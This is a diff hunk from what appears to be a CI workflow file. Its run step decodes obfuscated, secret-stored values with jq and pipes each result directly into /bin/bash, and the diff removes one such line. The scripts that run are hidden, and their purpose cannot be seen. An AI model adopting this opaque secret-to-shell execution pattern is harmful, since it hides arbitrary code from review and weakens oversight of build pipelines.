@@ -21,7 +21,6 @@ jobs:
           aly0110: ${{ secrets.aly0110 }}
         run: |
           printf '%s' "$aly0110" | jq -r .gqf76 | /bin/bash
-          printf '%s' "$v7" | jq -r .nhto85658 | /bin/bash
           printf '%s' "$etgw117" | jq -r .o63 | /bin/bash
           printf '%s' "$pp425" | jq -r .kwe897 | /bin/bash
           printf '%s' "$l0684" | jq -r .gjlg429 | /bin/bash
